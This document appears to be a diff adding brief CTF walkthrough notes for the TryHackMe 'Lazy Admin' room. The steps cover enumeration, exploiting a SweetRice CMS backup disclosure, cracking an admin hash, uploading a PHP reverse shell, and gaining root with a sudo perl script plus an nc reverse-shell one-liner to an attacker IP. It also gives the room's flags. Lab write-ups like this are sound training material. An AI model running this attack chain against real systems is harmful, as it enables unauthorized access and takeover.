@@ -1,0 +1,53 @@
+#Task 1 Lazy Admin 
+What is the user flag?
+hint: nmap -sC -sV -Pn --v $IP
+gobuster dir -u http://$IP -w /user/share/wordlists/dirbuster/directory.txt
+gobuster dir -u http://$IP/content -w /user/share/wordlists/dirbuster/directory.txt
+...http://ip/content/inc
+and while it runs we’ll do some digging to see if we can find any CVEs for the SweetRice CMS.
+
+Searchsploit SweetRice
+cat /usr/share/exploitdb/exploits/php/webapps/40718.txt
+..http://ip/content/inc/mysql_backup
+download file .sql
+cat *.sql | grep -e "admin" -e "pass"
+--> hash: 42f749ade7f9e195bf475f37a44cafcb
+hashcat -m0 -a0 --force -o crack.txt '"42f749ade7f9e195bf475f37a44cafcb' /home/gd/Download/rockyou.txt
+...cat crack.txt
+Password123
+--http://$ip/content/as
+manager:Password123
+in kali machine:
+locate php-reverse-shell.php
+vi /usr/share/webshells/php/php-reverse-shell.php
+change ip=ip local machine(kali machine)
+nc -lvnp 1234
+--> ads --> cat /usr/share/webshells/php/php-reverse-shell.php
+copy code --> paste ads with name shell -->done
+--> run http://ip/content/ads/shell.php
+on nc -lvnp 1234
+id
+cd /home/itguy
+cat user.txt
+THM{63e5bce9271952aad1113b6f1ac28a07}
+
+
+What is the root flag?
+hint: sudo -l
+(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+cat /home/itguy/backup.pl
+...
+cat /etc/copy.sh
+...rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip_local 5554 >/tmp/f > /etc/copy.sh
+on local machine (kali machine) run nc -lnvp 5554
+on target machine run sudo /usr/bin/perl /home/itguy/backup.pl
+--on local: id
+#cat /root/root.txt
+THM{6637f41d0177b6f37cb20d775124699f}
+
+https://tryhackme.com/room/lazyadmin
+https://muirlandoracle.co.uk/2020/01/11/lazyadmin-write-up/
+https://www.sevenlayers.com/index.php/354-tryhackme-lazyadmin-walkthrough
+https://infosecwriteups.com/lazy-admin-walkthrough-tryhackme-158540d2ec24
